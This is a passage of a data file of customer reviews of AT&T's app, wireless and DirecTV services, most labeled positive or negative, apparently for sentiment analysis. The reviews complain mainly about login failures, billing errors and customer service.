Then we got Showtime guy says no charge your right. Ok so he was gonna credit the 2 months charged.  We called again, lady said oh she would credit showtime!  Nope!!  So then the contract was coming to an end. Mind you showtime never did get credited.  Ok so now our contract is about expired and our bill was to go up considerably.  I called in to cancel due to all the frustration and them not doing there job.  They didn’t want to lose us as a customer.  I said only way we stay is if that 40.00 in showtime is removed and we keep our bill what we’re paying now or less.  So still to this day, the showtime charges that weren’t to be charged to us, still on our bill.

It is so infuriating. I simply want to pay my satellite bill. Every single time I have to attempt a password reset because it’s not recognizing my attempts to log in. Or I do change with a temporary password & it still won’t allow me to log in. Here’s a hint guys- ONE email address and ONE password for both my cellular service & my satellite service. I can find “which bill would you like to pay” once I’ve logged in. You could not possibly make it more complicated. Get it together & maybe I’ll consider changing my review.

No reason for not having service and no response from the team we called to send a signal to the house (after waiting more than 45 minutes for them to answer.  I have seen other services that rely on streaming for free or a mere pittance, in comparison to AT&T charges.  Paying close to $300.00 for your services is ludicrous.  I have seen Cox cable.

"The app requires verification after you log in with your password, and you can send a text to your cell phone to get the code.  The problem comes when you go to your messages to get the code, since the AT&T app signs you out when you leave the app, so you can’t put in the verification code.  They need to fix this issue!!",negative
"I have been trying to log into my account from my iPad using this app but have been unsuccessful. My user ID and password works but when it comes time for me to enter a verification code that’s generated by this app it comes back with an error saying “oops something is wrong”  This has been going on for at least 2 months. Can this be fixed, please?",negative
After I log on it has the loading wheel of death. I waited for about 10 minutes before I just closed it out. Even when it did work previously it takes forever to load.,negative
Isn’t showing usage data. Have family member traveling internationally and wanted to help track usage to avoid crazy fees. Not able to provide usage data for five days.  Garbage.,negative
I miss having a reminder that my payment is due. It’s hard for me to remember and I can’t do automatic payment.,negative
So bad service ... I have a problem long time and nobody can help me with,negative
App reflects a pay date of Jan 2019. It’s June 2019! This app is lame.,negative
"I have tried numerous times to use your online system for questions.  I can never find answer to question I have.  I have tried your “chat” and got kicked off site several times after input of my questions.  Never did get to chat.   Trying to talk to an actual person is almost unheard of.   Very, very bad system,very, very bad customer service.   Directv was good to work with until they merged with AT & T, now it is horrible.",negative
WORST company to deal with they make promises and never follow through. It takes DAYS to get one of their mistakes fixed and no one ever knows what they are doing. They say they document conversations but never do. Go with ANY company other than ATT,negative
I have been prompted for my password EVERY time I log in whether I have said to save or not. After relogging in and logging out I tried logging in again with touch and was prompted AGAIN for my password because you hadn’t seen me for awhile???!!! It was all of 2 hours. The site is hard to see details of both my phone and directv. This was so much easier before you merged the access to both. I expect more from ATT. The customer service was of no help what’s do ever,negative
I have had AT&T for 20 years. I have been using this app since it came out and it was always fine. Well I also have Direct TV and now that att took over Direct and merged the apps. Every time I try to pay my bill for Direct Tv. It signs me into Att wireless. So if you use this app to pay your bill. Its faster to drive 20 miles and pay it. Your overall health will be better from not jacking up your blood pressure. .,negative
I like checking my data on the app. It has not let me check this in 4 days. The app won’t update. What is going on?,negative
I loves the Att app,positive
"If you want a simple, easy way to deal with existing accounts this isn’t it. It’s bogged down with all kinds of junk and offers to sell you more services. It’s slow and clunky.",negative
Sooooo tired of prices going up!!,negative
The new updated app stinks. Not sure who’s idea it was to update but they should go back to cleaning bathrooms. I wish there was a way to go back to the old app. I am also looking to change provider. They are to expensive. Paying over 200 a month is not cutting it anymore.,negative
Att is the WORST company I have ever dealt with in my life.  Consistently for my adult life. Especially now.,negative
"Bill is never the same. On an “unlimited” plan; yet, my bill changes ALL the time. I was grandfathered in an unlimited plan; changed it to a supposedly same thing for me and my husband. It’s NOT the same. Always afraid to see what my bill is for the month. Is it going up another $20 this month?!?!?",negative
I barley get the service I’m paying lots of money for . The internet is really slow and it’s supposed to be unlimited other than that I am satisfied.,negative
"I have had problems with my billing with both AT&T and Direct TV ever since AT&T took over the billing for Direct TV. I pay all my bills electronically through my bank. I make two different bills both carrying the AT&T name but two different account numbers and different mailing addresses. Sometime both payments go to the same company then they send me a credit and the other company sends me a passed due notice. I have even had my service cut off due to non payment. When I complained to AT&T about it they said the problem was that the billing departments of the companies did not communicate with each other and they were trying to correct the problem but it has been over six months since AT&T took over the billing and it is still not any different besides the fact that you may have your service disconnected because the two company billing departments does not communicate with each other. I know several other people that are having the same trouble as I and they are getting the same excuses that AT&T gave me. My suggestion is to rent the movies you want to watch, listen to the radio or read the news paper to stay up on what is happening in the world and write a letter or send smoke signals to whoever you need to communicate with and tell AT&T and Direct TV to stick their services where the sun don’t shine.",negative
"Apparently the app has been asking to send a code to my phone to ""make sure it's me"", but the code is never delivered! I've tried it on ALL of my lines, so this app is useless now.",negative
I currently have Direct TV and wireless service through AT&T. I believe if I have services through a company I should have access to all of the accounts I have with that company. Currently with AT&T you can not. So sad for a tech company.,negative
Absolutely the worst functioning app I’ve ever seen. Doesn’t even respond to what you do 90% of the time. I’d expect more from a multi-billion dollar company.,negative
"I haven’t been able to see my bill in this app for over 2 months.  Each tome I call they say they are having issues with online billing.  Apparently ATT doesn’t care much about their customers as it seems they are doing nothing to fix the issue.  No information has been emailed, mailed or put on the site or app to explain what the issue is or when it will be corrected.",negative
This is absolutely one of the worst apps I’ve ever used to pay my bills.,negative
"Over charged for latest bill. Rates went up and no prior notice.  Can’t even get WiFi.  Charged for late payment when it’s not even due yet. 
Have call protect and still dealing with security problems.  What an Awful company. I have to call every single month on charges we should not be receiving.  
Service and s terrible, coverage is awful and you can’t even talk to an American if you call them.  Can’t understand what these people are saying and they do Not help you at All.",negative
Unable to do anything on this app a total waste of my time .,negative
"Just Iike most of the things AT&T does, this app needs some work. I hope one day they can actually create a product that works like they promise.",negative
"App is not working properly, it is necessary to logout and login again to access my user. Internet is not working as well, 7mb speed for Download and when we try to check with own speed test from the app, it shows 330mbps. Lier!!",negative

"The page to send a verification text does not work on my iPhone XS, so I can't log in!!",negative
My account has been messed up for almost a year. We change our subscription but for some reason (no one at att can say why) we continuously get charged for services that we dont even have anymore. When we call ATT is very sorry and always willing to work with us but what a hassle to have call every month/other month and have to explain ourselves every time just to get credits for next months that get eaten up bc we get over charged again. We can’t even keep track of all the credits that were wrongfully put towards new bills that were wrong by over $100.  When a rep gets on the phone the first thing we say is that we are going to give them 5 min to get caught up in ALL THE NOTES ON OUR ACCOUNT. Again no one can say why it’s happening or how to fix it. Just apologetic. We like UVerse. We’ve been with att over 7 years. Please for the love of all that is holy someone just get our account right so we don’t have to call every month and can get back to just being good long time account holders that dont bother ATT. Don’t believe me look up my account and check the notes. It’s a novel,negative
AT&T is the absolute worst at everything,negative
"I have set up TouchID and selected save password, but the app keeps asking for password whenever I open the app.",negative
The worst....  yes. Can’t even find out when contract ends. Do what it says on their app to get there and it doesn’t even have the selections it tells you. AT&T keeps going up and so does the bundled price with directv. This merge in companies is the worst. Both are terrible and many bait and switch occasions have happened since I have been with them. ????????????????,negative
Multiple lies about monthly bill. Failed to honor the bill I was quoted three times. Switching to another company after 5 years with AT&T and hundreds of dollars stolen. Lowered my bill by over $100 with the same services.,negative
"Are you guys out of your mind, for doing verification step as logout and log in for chat sessions......",negative
"The at&t app is horrible!!! Why does it keep asking to link account and when you do, it does nothing? There’s no way to pay billl thru app.",negative
Doesn’t hardly load,negative
"It is insane for this technology to be as slow as “A Herd of Turtles” And Self Serve???  If I called Customer Service, that means I want to TALK TO SOMEONE.  I don’t want to keep repeating “yes or no”, to an autobot. The autobot doesn’t work. I am frustrating myself even more as I try to type this review. Please folks do something about the Tortoise Paced DSL. While you’re at it, please please please Answer the Phone at Customer Service. At least offer to call me back.",negative
"every time you do an update, you lose all my saved information. your streaming apps also are so buggy, it makes it unviewable. your network has also gone downhill.  the data speeds on my unlimited plan have dropped to like an average of 3mbps.  as soon as my contract is up, Adios!",negative
I spent the last three days on the phone each time over 2 hrs. The fraud department was to call me 10:00am on the 13 th no call no text no email.,negative
"Doesn’t keep up with current usage, so useless for monitoring your devices and users. Can’t think of what else I would need this app to do.",negative
"This app’s most important function, the ability to add and remove channels, does not work. Worse than that, when you get in touch with an individual to change your channel package, it takes too long. Then they ask for more of your time via a survey request. I feel like I’m owed back pay for the constant wasting of my time.",negative
Customer service is great and the plan with my discount is awesome,positive
This app is not easy at all.. Hate it!!! Then you call at&t it takes forever and they are clueless to what's going on... FYI if you run into Johnathon Bowser run he's a lier and a con artist..At&t will not do anything about him... He's a horrible individual and yet this company continues to let him hurt people..,negative
"The app just churns looking for my account information. I have deleted the app and reloaded. My device (iPhone 10) is up to date on the latest version. I went to the ATT store for help. No one can figure out the problem. To note, it worked for many months and then just quit.",negative
So far slow,negative
This app is horrible when it works but lately it has been down every time I try to use it.,negative
Too hard to merge accounts together,negative
I’m loving it..,positive
Mal servicio,negative
"The app is ok, it does glitch at times in which it states wrong information. PLEASE FIX YOUR GLITCHY APP. It doesn’t work consistently!!!",negative
I can’t use my hotspot from my phone and can not get any help on this useless app. When it takes me to the website and tells me to sign in it takes me right back to the app to ask for help again and it just keeps going in a vicious useless circle. Like a idiot walking in circles thinking they are going somewhere. Come on AT&T you can do better than this crap!!!,negative
The app is convenient I like using it to pay bills etc but 60% of the time I go to log in and I get error message currently unavailable or will let me log in but can’t pay my bill because it won’t load properly super frustrating but still I use it non the less wish the bugs would get worked out,negative
Not really tho,negative
Very easy and useful,positive
Half the time the app won’t load or has some login error. Other times “something went wrong” when trying to make a payment.,negative
Received a call that were going to disconnect me. And when I verified I still have till the 21,negative
I recently transferred my wireless phones to Verizon to get better coverage. I thought my AT&T account was all connected to my main number and that my account would be closed after it was ported. However I just received a bill for my iPad mini that was not ported to Verizon. I called to cancel it and close out everything with AT&T but they said I still owe for future data plan and will not get an adjustment to what I owe. My billing cycle is for 06/09/19 to 07/08/19 and I found out I owe $47.33 today and called immediately but today is 06/13/19 so I have to pay for future data that I cannot use. I have only had AT&T until now and I will never go back to them over such as this.,negative
"I’ve had this app for about 3 years now expecting it to get better with updates, but no. The app remains slow with horrible UI and always has errors and/or issues. I would expect something better from a multibillion dollar company that charges outrageous prices for there service.",negative
Terrible app,negative
It’s not loading and I can’t look back at my call usage. Also it makes me do a nickname to send my review and did not like the one I picked so is wasting a bunch of my time,negative
"Every time I try to use the app there is an update, every time I needed to reconfigure the app. Again today I tried an I cannot login, stuck on the first step",negative
Very impressive and fast way to make the payment; great improvement,positive
"The absolute worst customer service.  The app and website never work.  I can’t even check my bill because  neither eve work.  Call customer service to complain, and get someone who not only cannot help; they barely speak English.  If you are considering AT&T....run now and don’t look back!",negative
"Impossible to recharge, from another country to keep the number working.
I will lose the number for the second time in one year.",negative
Smooth very fast. Updates very quickly and easy to understand,positive
It takes forever to load the amount,negative
This app and this company is trash .,negative
Please remember that not all of your customer support the LGBT movement. I pay my bill without expressing my political or religious views to AT&T. It would be nice for me to be able to go on AT&T’s website without seeing the rainbow flag thrown into my face.,negative
They do not communicate one with another. They do not consolidate phone conversations so each service call is a brand new issue. You have to speak with the same service rep and those representatives are hard to get ahold of. The service reps do not call back with answers which forces us to call back and start over with another rep.,negative
"Very disappointed that the att is so poorly designed and extremely unresponsive, especially since att is the carrier that had the iPhone since it launched in 07’. Step your game up att, this is just embarrassing",negative
"I m long time Customer, the service and Customer treatment is substandard, very unprofessional.
My ordered High speed internet, the “HIGH” is for the “$$” not for wireless speed.  He real wireless speed is half or less what it supposed to be, it does not meet the advertised wireless speed.",negative
I get to the login screen where you pick your account and I can’t get any further. So frustrating!,negative
I can’t even get into my account which I can’t even set a account up,negative

"My AT&T app has not updated in over a month. I have made sure the actual app is fully updated and signing out and back in. I wish I could just delete it and reload it to my phone, but there is no option for that! No stars if possible.",negative
My AT&T widget for iPhone will not function and update usage on locked screen. It keeps saying log into my AT&T app and save password. Once I log into the app there is not an option to save password. You have to type your password in every time you log in.,negative
Very easy to pay with and manage account.,positive
The app is really cluttered before you are able to login to your account. I would like it more if the login option was more prominent.,negative
"The only reason I got this app was for the “data usage widget” that AT&T has on the iPhone. Unfortunately it stoped working months ago. I have given AT&T time to update but mum is the word or even acknowledgment that their is a problem. 

Now the app itself won’t work. Always having problems connecting to server. On WiFi or wireless. :-( must be embarrassing for AT&T.",negative
This app was perfect until recent changes. Now it’s awful to use.,negative
Awesome service. Super happy!,positive
The mobile app can be better. It takes a long time to load or it doesn’t work.,negative
The app for AT&T doesn’t work. Then if you call you get charged. It’s a rip off trap.,negative
"Thank You for your kind services. 
LaShandra helped me and I am very pleased. Hopefully, we will renew our services in March of 2020",positive
Overcharging like we’re still living in pre-historic times. Customer service is horrible and it’s intentional (so customers would be reluctant to call to dispute the bills). The company needs to be broken down ASAP.,negative
Quick and easy payment method ??.!,positive
I can’t pay my bill on the app.   It’s not working like it used to.  Very inconvenient.,negative
Can’t use from non att device,negative

Horrible service. WiFi has a terrible connection. Too expensive!,negative
"I get a text saying my account will be suspended if I don’t pay.  I login.  And it shows I have a zero balance!  I can’t tell if this is my home or wireless account.  Why aren’t they the same?  I have 3 different freagin accounts I have to keep up with.  I’m just one person.  Get your crap together and consolidate your billing!  My wireless, cable, and home security all bills differently and I can’t tell which is which.  Then....you let people steal my info and screw up my accounts and then when I have to cancel credit cards and have to reset up everything if I miss one YOU want to charge me?!??    That’s lame and awful.  Consolidate!  And secure your business practices!  I’d get fired in my job if I operated so sloppily.  Smh",negative
"Exactly what I said. 

Too glitchy.",negative
"Customer Service is horrible. You are told when you call there is a wait time of 10 minutes due to heavy call volume. I stay on the phone at least 35 minutes waiting before deciding to hang up. Also, the foreign representatives are of no help and say they can not transfer you over to someone in the USA. We have been loyal customers of AT&T for many years, referred friends/family, but after the last few years, we are seriously considering a switch. Hopefully things get better, but we just about have lost all confidence.",negative
The app is so slow to load. Always and not matter where I am. And it constantly shuts itself off.,negative
This is the most enept company on the planet.  Stay away from all apps and affiliated programs.  They do not even know there own technical problems and are unable to help you!,negative
I never have had luck with this adding an app! I just don’t understand and it will not finish my job! Ever on any!,negative
You billed us for Two tv services ( both AT& T ) in one month ... then endured long delays to get to agent to get them fixed,negative
Only works when it wants to. Its very slow. The links just take in circles.,negative
AT&T recently added two factor authentication so that the app sends a code to your phone. Problem is the “send” button doesn’t work on iPhone or iPad. This means there is no way to use the mobile app. It kind of makes the app pointless. So much for QA. ??,negative
Thank you,positive
No me gusta,negative
I was told I could get a bogo deal on new phones.  Only needed one but if it is free why not.  They said bogo would kick in after 2 months.   Called serval times and they tell me a manager will call back.  Never got a call back.   It has been almost two years.   So over AT&T and liars.,negative
"Can’t find what I am looking for,  horrible design",negative
This is way more easier than going to att.com to pay. With the app you can make easy payments and you really don’t need any WiFi or hotspot to use the app I really recommend this app simple easy awesome,positive
"I have had nothing but a great experience with AT&T. 
I thank you for your commitment to  excellent service to your customers.",positive
"I was on a live chat but your app froze and won’t let me type. I had to reboot and lost the chat. Before I started the chat I called your customer service due to billing error. The rep could not take care of the issue so she transfer me to loyalty team. After more than an hour on the phone including almost a half an hour hold, the loyalty team member hung up on me. This is incredibly annoying.",negative
Half of the time I try to login to pay my bill I get an error message saying that the app is down.,negative

"Update: now it will not connect at all!  What is going on with this app?  It just shows a white, blank screen when it says it is “connecting” to my account.   Please look into this issue. 

Since the update to the app, it freezes, won’t continue to my account information, and takes multiple steps to get to it when it does decide to work.
Worst update ever!",negative
I pay my bill get confirmation from them see it taken out of my checking then they say I haven’t paid it. This has been going on for two months. They want me to call them but they’ve turned my sim off. I am just plain disheartened.,negative

"I have to start that this post couldn’t be posted with no stars! At least one star rating has to be given for review to be posted.  Wow!!! 
Ok here is our experience...We have been directv customers for a long time and never had any problems with billing. We always had auto pay for the convenience of getting bill paid monthly.  So all was good until I noticed 2 things. 
First thing was the total bill amount went up with no explanation! 
Second things was billed twice in one month!! The two bills came within weeks of each other. When I called to get this explained all I was told was my due date was changing and that didn’t make sense for receiving 2 bills for the same billing period. 
It’s a mess and we are shopping around where to take our business. The only good thing is that contract obligation has been fulfilled and if you can GET OUT!!! AT&T is a mess!!!!",negative
I don’t understand why I am not getting a discount I have att plus and direct tv premiere and I am paying out the butt for both !!! SMH !! Why don’t they give the loyal customers a break,negative
"AT&T is awful!! I’ve been with them since I was 18, when they were Cingular. They have the rudest, laziest customer service ever!! I actually had to have a employee from apple help me deal with the jerks at AT&T! He was appalled because he worked for AT&T & Sprint b4 Apple. He couldn’t believe the run around they gave me. No one wanted to do their job! Thank god the Apple guy helped me and was able to tell them what they needed to do, they weren’t happy, but he was right. 3 hours later I was finally off the phone! All the $ I’ve paid AT&T in the last 20 years is disgusting! The least they can do is help. Instead they want to be cocky & not do their job. Do they think I love taking hours out of my day to call & then to have workers over my house all day?? Switching very soon! Phones, internet & cable.",negative
I hate speaking to customer service the are not customer friendly,negative

Every time I try to use any of their online service it seems that I can never accomplish what I need. I hate to call because it always ends up being a two hour ordeal.,negative
"Auto everything, so now we have no one to complain too, for them it’s Heaven, for us it’s down Hill. No customer service, this time I’m locked out of my email on the computer, but I can still get thru on my cell phone and tablet, I can sign on the app but all I get is notifications, the rest of the app is a white screen, it all went bad when ATT hyjacked the Yahoo email servers, so I can’t login to my account online or get my email online. I can use my cell phone or tablet just can’t see anything about my account, it’s there, I’m in,  just nothing there. Thanks ATT",negative
I have use them for over a decade but getting a number to call customer service is impossible on the app.,negative

This is completely wrong.",negative
I’m so happy with Great service.At&T is the best choice for me. I recommend to all persons who wants best quality and best service.I’m almost from 10 years with them.I’m happy!,positive
"I am very disappointed with ATT; they shut off my phone for 4 days!! Complaint filed with FCC as I had a credit on my account... all I wanted to do was change the billing into my name from my deceased partner but never got a paper bill, nor anon-line I’ll,  or auto- I’ll payment, could it log onto my account, only more threats to shut off my phone... They have the worst customer service ever!",negative
The app overall is good but after this last update I have to enter my password every time. I have Face ID enabled and still it asks for my password. I can close the app and log right back in and it still asks for my password. Please fix this!,negative
I can’t imagine that ATT can’t even come with normal Application no mention that they Direct tv never works too,negative
New app update kicks me out every month. It used to go directly to my account information and now each time I open the app I have to navigate through their website to get to my account information.,negative

New app stinks can’t get in will be switching when contracts are up,negative
Not user friendly,negative
"AT&T apps are the slowest in loading times, most inconsistent as far as working part of the time.  Customer service is terrible 75% of the time unless you ask for American managers.  To top it off they have been charging me TX taxes & fees on my second line but I live in Cleveland, OH. on average paying .13 more and if you kno how companies pay there taxes you should know they are in for a future court proceeding over mismanagement and thief.",negative
Their over rated...the app to monitor my data usage can not retrieve the data half the time but that’s understanding if the are using their network to do so.  Live 80 miles west of our nations capital and can not carry a phone conversation using the service for a 60 mile commute.  Then when home 1 bar of service where half the time I can’t even send a text message...$120 a month I guess is asking too much to actually use their service.  Would love to see all this money go towards an infrastructure rather than false advertising of their crap service.,negative

So this version of the app is harder to use. Instead of taking me to the information about the account I already have it starts on the store page. Also the data widget does not work properly. Hopefully next version of the app is more like the last versiob,negative
"1. At initiation, different data plan assigned than requested, had to contact customer support few times before getting fixed 
2. Yet to receive military discounts, despite providing documents at initiation and later on through self service, keep contacting customer support to get it fixed

So disappointed with the service provided!",negative

You did the reverse and now my father hasn’t had his uverse tv working for over 24 hours.  Called twice yesterday and told me it was resolved.  Today still no tv.  So ridiculous.  I have 5 iPhones with ATT service, I think 6-7 directv receivers and uverse and I’m treated like this?

Dear. AT&T when I started this service two years ago I was pleased with my service.  but as of them now I’m not because I feel like I’m being overcharged with these ridiculous prices when I purchased these phones and tablets back two years ago they told me I will be getting a discount starting in that same year two months at the purchase I’m very and I’m shopping for new services with a Nother company!!! As u can see I turn to tables off looking for a better company thanks for your service...460.00 last month ridiculous price,negative
The app won’t update. It says to try back in a few minutes. It has been 13 days.,negative
"AT$T is sooooooo slow.  I admit I can stream movies without many interruptions, but there are interruptions and buffering.  If I hadn’t experienced high speed internet with Comcast I probably wouldn’t be this disappointed in AT$T.   Comcast blazes and AT$T dribbles.    
I cancelled Comcast because I hated their monopolistic hold on fast internet, but what a childish move.   Now I have 16-17 months left to suffer with slow Google searches on my phone and computer.    
I turn Wifi off when I use my phone because my cell connection is faster.

If you are considering service in Georgia, DONT USE AT&T.",negative

"Buyer beware!!
Approximately two months ago I went to a Sam’s Club where I was called over by a young man who was working for AT&T. Promotional phones buy one get one free. I listen to his pitch, as I was in the market to buy phones for my son and I. You’ve heard the Old saying that if it sounds too good to be true it probably is. Well I should’ve listened. I was told that I could have two brand new iPhones RX. Buy one get one free what’s the offer. The amount was 799.99. They also gave as part of the promotion $100 gift card for each phone. Which would’ve brought the amount down to about $600.00. I thought it was still a pretty good deal since those phones run roughly close to $500 apiece. I asked several questions. Such as was it real unlimited data? Not the kind where they give you a certain amount and then slow it down to where you can’t use it if you’re not by an Internet connection. I was told it is truly unlimited Internet. I also asked if there would be any problem for me to take the phone, after I paid them off if I wanted, and to go to another carrier. I was told there would be no problem once I pay the phones off. Well you get the picture. Dealing with this company has been a nightmare. Not only have a nickeled and dime to me on my bill, They try to put both of my phones on two different accounts. I went from true unlimited data on my last carrier to having three gigs between the two phones each month, and then it slowed down to the point of it being ridiculous. So I decided I would go ahead and pay the phones off. Once the phones were paid off in full , I find out that I have to have service for two months, so as not to have any type of penalties or repercussions per the agreement. Again, not mentioned at signing. They tack on this feature where there is what they call a visual voicemail, roughly $20 a month. You’re not allowed to take that off without defaulting on the contract. That sounds like a great feature only 90% of the voicemails can’t be transcribed, So you’re either getting a half messages or blank spaces where the computer couldn’t make out what was said. So I waited,. Then they make you jump through hoops to get your phone unlocked. That was a really big ordeal. You have to go through a website and put in your information, then you have to wait 24 to 48 hours for AT&T to approve the unlocking up the phone that you now own! Finally I was able to get one of the phones unlocked, my son’s phone, which is not the main phone on the account. But when I tried to get my phone unlocked, lo and behold I find out that their sales person was not honest with me and did not explain how things really were. This is not a buy one get one free phone. I just found out that in order for me to get my phone unlocked, I have one of two options I either have to keep the plan where they will give me credit for the second phone, and continue to use this ridiculous  service where I’m nickel and dime to death, and still have no unlimited Internet or data or I can pay the second phone off and lose all of the credit. In other words they’re charging me $799.99 for the second phone as well. The The customer service person who I talk to, who explained all of this to me, apologize that there was “a misunderstanding about the agreement concerning the phones”. All I can say is WOW!!!! When I called and paid off, what I thought was both phones a month ago, the agent that I talked  to, who took my money said nothing about what I was told today and let me to believe that both phones were ready to be unlocked when I was ready to take care of that. It’s a sad day when a company as big as this treats their customers this way. All I can say to those reading this it’s buyer beware!!!!
Once I decide how to handle this, I will never do business with AT&T in any capacity again!!!
Look I even tried to take the star off that I accidentally tapped, because this company doesn’t deserve any stars, and I can’t even I’m do that! Wow!",negative

Everything I have to login to my account on my desktop. It’s ridiculous! Going on vacation? Don’t even try using this App to pay your bill.,negative
Horrible service provider! This phone company does not even deserve one star. They do not work with customers or try to help them under any circumstance. They were very rude and not willing to help me at all. So disappointed.,negative
I don’t know why you changed your app. The way it was until this month was awesome. The new one is a pain - more steps just to get to my account and it’s super slow to load. Please fix the bugs and get it working faster! Thank you.,negative

Horrible interface and app often glitches,negative

Keeps telling me I have to link my account. I have.  Multiple times.  Just keeps kicking me back out.,negative

"At&t is the biggest scam ive seen for a phone company, we signed up when there was a deal to buy one iphone and get another free. Well needless to say we have been paying on both this whole time. Everytime we bring it up in the store to employees they say they cant do anything it has to go to the “higher up’s” to get handled. Big shocker, nothing ever got fixed! Getting robbed every month from this company.",negative

And now Pablo is telling me my internet is working fine but it is my U-VERSE that hasn’t been working for 6 days.  I pay too much money for this inconvenience and incompetence!!!!!  Now Anthony is of no help AT ALL. If the appointment was cancelled, then SOMEONE SHOULD HAVE CALLED. You can take my money every month. HORRIBLE COMPANY and the CEO doesn’t care that HIS company treats his customers like crap so long as he gets his money, drives his fancy cars, and take his lavish vacations.",negative
Never in my life seen a company so big where nobody knows what is going on. I could go on for days....,negative
"I ordered internet over the phone last week and wanted to check my order status online, as I selected self installation. Kept getting errors when attempting login online at att.com with my username and password. the error message said that they don’t have that username or account in there records, so I attempted to recover my userid and password. Did that whole process and got the same error, so I started a chat online with customer support. After 2 hours and 4 “specialists” later, they had only attempted for me to reset my password which I had done myself. After those two hours I was told to call the service help line. I called them and again had to reverify everything even though I gave them a case ID number. They then transferred me 2 more times where I had to again reverify my info (even though I already had and had a case Id number) then they told me that my account isn’t active. Which doesn’t make any sense since when I ordered the internet I also setup a userid and password. All I wanted to do was check order status, and I’ve wasted about 3 plus hours just for them to tell me that it’s impossible to login. Literally doesn’t make any sense, and 6 different specialists have done nothing to help. Extremely painful, and it seems like I always have issues trying to do very basic things with att. Extremely frustrating.",negative
"I have been a loyal customer of Att since 2009 I not only have them at home but I also have at my business.My phone service was disconnected after I had made payment arrangements on May 31 until the June the 12 they disconnected my phone and tv service on June 10 and I had to pay the whole amount plus $35 Reactivated Fee plus $5 to use agent. I never been so disappointed because they saw they saw know arrangement on file. I took the young lady name and customer Id down but it was written at work. But they didn’t believe me . So I will tell everyone what Att did and to make sure they get all of the information when they speak to agents. From text to email. Because I think they only want the full payment and the we need to reconnect fee. The supervisor which name is Lathima was had the horrible is customer service.:( 
Will be changing service to either sprint or to Comcast. Have already inquired. So thanks AT&T",negative
"ATT is the worst customer service company in existence. There computer systems are horrible. Somehow an address for a place I’ve never lived was entered into my account. It tools months of hard work totaling 80 hours for me and I had to speak to more than 60 different agents. All because they had a wrong address. I had correct service at my house, but since there was this false address on the account I couldn’t validate my account. 
When my service wasn’t working correctly I called ATT and was told that since I couldn’t validate my account I couldn’t get service either. I was paying extra for service on my account and they wouldn’t fix it. I also couldn’t make changes to the account or cancel the account since I couldn’t validate my ID. Later I found out the house address for this screwed up account. The house was in construction and didn’t even have electricity. So to correct everything ATT put the correct address in. My current working service with a bad address stopped working. I didn’t have service for three days. And they still charged me for the service. No one cared and even though they said it could never happen again-they were wrong. It’s happened again. My service was turned off. Service people were sent to a wrong address again, and the people on the phones are horrible. One even said I never had an account. Save yourself the headache and stay away from ATT. I’ve filed a complaint with FCC. Bad bad company",negative
"Pretty sad that the largest telecom company on the planet can’t provide their customers with a functional, helpful app.",negative
"I am so frustrated by this recent upgrade to AT&T’s app. It is totally inaccessible, despite entering the correct login ID and password. Sometimes, if I am lucky, I can log in on one a particular phone. But the login NEVER works on my other phone or my laptop!  Today, I cannot get into my account on any of my devices. The worst thing is that these new customer support lines are now rerouted to a call center outside of the USA. The reps are nice enough, but they are not yet up to speed to really help. Moreover, they don’t even have access to basic account information to assist in clarifying any issues that you need help with. I work overseas with a fast internet connection connected through satellite with the USA. And, I shouldn’t be struggling like this. As a result, my cellular service was disconnected because I could not log in to set up my payment. I  am so discouraged and disgusted with AT&T. Thanks for making your service inaccessible to those of us serving overseas. We deserve better!",negative
App is basically worthless. You talk about how you upgrade it to what we want. My app has not updated my bill for 13 days. How about this? Make it work correct and then stop screwing with it!! Leave it alone so I can see my bill and usage as of current.,negative

The app never shows my bill and even said my balance was up to date when I had a bill due and now I’m paying it late because when I called the number it also said my bill was paid. But now because none of this works my bill is late. And there is no easy quick fix for any account issues. And the 611 number is a joke!,negative
Do not waste your time with this download. Can not be accessed after multiple tries. Direct has gone downhill after becoming AT&T. Not a good fit. I know many who are leaving for this reason alone.

I got charged an upgrade fee when they give me a phone for starting up when I had to pay another 130 for other random start up fees.

The bill came in WAY higher than expected and makes no sense. It is all vague wording with no explanations on what it really is. The online chat was useless along with the walk through video. 

Got close to using all the date and wanted to see what was eating it up and all it said was “technology”. Ummm what?",negative

I have never had so much difficulty trying to pay my bill as I have this month. It has been both difficult and stressful!,negative
"This app, while constant updates are happening, continues to get worse and worse. It has a Touch ID login that never works. Half the time the app crashes. And it doesn’t always have the most current info. Better to just call or go on line ???????",negative
Worst service and customer service and tech support are rude and not at helpful in resolving issues when you call them. Also they’ll tell someone will call you later to follow up and never do. They are a rip you off sort of company.,negative
AT&T cannot figure out how to properly bill my account. Each month we receive the $23 credit for buying two phone under the buy one get one promo. My bill ends around the 20th of each month but the credit doesn’t hit till after the autopay occurs. Sounds simple and one would think this would just catchup the following month but then AT&T applies the previous credit and provides the current month credit before the autopay occurs. I know in the end I am getting the discount but why can’t a billion dollar company figure out a simple billing process. I have brought this to the attention of sales people and managers at AT&T all who assured me this would be fixed moving forward....it’s not...and at this point can’t wait til the phones are paid off so I can switch to a provider who listens and takes action on what they promise.,negative
"I was told when I purchased my cell phones I could bundle, my house phone, internet, direct tv and cell phones all together and save! BUT I’m paying more than ever! Very disappointed and no one can explain to me why I can’t bundle other than their computer system is being updated but that’s been updating since November of 2018! I did talk to a lady about my direct tv but all the sudden we were disconnected and she never called back. So as far as I know that deal never went through! So I’ll most probably be changing my direct tv to dish because of the cost! Before I agreed to anything it’s like she could no longer hear me and she hung up so that deal fell through!",negative
"Unable to locate overview to access call blocking feature, why so difficult",negative
"Every time I go to pay my bill, my bill is higher than the previous month. Every time I call about this issue, no one seems to know what is happening. Very disappointed. Will never use AT&T again. Will never recommend anyone to use this service.",negative
"I was on a tour of the American National Parks, upon returning, I received an e-mail advising me of an increase in my monthly because of the change I authorized. I never authorized anything. 
Calling Customer Service was a frustrating joke. The CS person continued to text from a script never answering my questions. I requested a supervisor call back. The text returned was our Supervisors do not call Customers.
Finally got a Supervisor call back only to be hung up on by the Supervisor. Supervisor called back and transferred me to sales to upgrade my plan. 
I learned AT&T is blaming the government for the increase. The real answer is forced up selling by AT&T.  Apparently AT&T is moving to 6g and is cancelling all plans that are 4g. But they are giving you free HBO and offering free Direct TV on your phone. 
I do not use my phone in this manner.  Why is one size fits all the only policy. I was told a notice was printed on the last page of my paper bill. The Supervisor was shocked I was not receiving a paper bill.  Remember the BIG campaign AT&T went through to force us into digital billing? 
I have reviewed my last 6 digital Bill’s and can find no notice about any change.
I asked for a transcript of our chat and a letter confirming the change to 6g. I received two blank e-mails. 
I too am a long time AT&T Customer, since 1988. I guess it is time to look for an honest carrier, if there is one around. Thank you AT&T for showing a long time Customer how little Customer Loyalty means to AT&T.",negative
JUST FAT OUT HORRIBLE...,negative
